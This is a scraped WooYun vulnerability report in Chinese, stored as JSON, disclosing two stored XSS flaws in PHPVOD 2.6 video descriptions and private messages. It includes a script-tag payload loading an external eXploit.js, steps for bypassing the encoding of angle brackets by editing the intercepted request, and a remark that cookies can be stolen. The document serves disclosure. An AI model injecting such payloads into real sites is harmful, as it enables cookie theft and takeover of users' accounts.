{"id": 54165, "wybug_id": "wooyun-2014-065342", "wybug_title": "PHPVOD两处存储型XSS漏洞", "wybug_corp": "phpvod.com", "wybug_author": "dilcon", "wybug_date": "2014-06-18 16:42", "wybug_open_date": "2014-06-23 16:43", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPVOD两处存储型XSS漏洞，可打任意用户 详细说明：  涉及版本phpvod2.6测试地址：http://vod.phpvod.com/通杀所有浏览器1、PHPVOD存储型XSS漏洞(一)发布视频模块，PHPVOD对视频内容简介过滤不完全，导致存储型XSS，用户查看视频时，漏洞触发，可加载任意恶意脚本代码。2、PHPVOD存储型XSS漏洞(二)PHPVOD对短消息模块过滤不完全，导致存储型XSS，阅读短消息时，即可触发漏洞   漏洞证明：  一、PHPVOD存储型XSS漏洞(一)1、发布视频，在内容简介处填写<script src=\"http://127.0.0.1/eXploit.js\"></script>2、发送请求时，系统会对<和>进行编码，拦截请求，修改编码：修改前：\n\n对请求部分的内容简介进行修改：\n\n3、普通用户查看视频，漏洞触发：\n\n使用Firebug查看页面源代码：\n\n成功加载本地脚本文件，通过修改eXploit.js文件的内容，我们可以盗取用户cookie或者进行其它的恶意破坏。二、PHPVOD存储型XSS漏洞(二)1、给其它用户发送端消息，消息内容为<script src=\"http://127.0.0.1/eXploit.js\"></script>2、发送请求时，系统同样会对<和>进行编码，拦截请求，修改消息内容为如下形式：\n\n3、用户查看短消息，漏洞触发：\n\n4、使用Firebug查看源代码：\n\n成功加载恶意脚本代码。   修复方案：  1、对特殊字符进行过滤   版权声明：转载请注明来源 dilcon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-23 16:43 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-25 09:59 |    \t\t人生turning point \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        )\t\t \n  请问你用的是什么xssshell    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}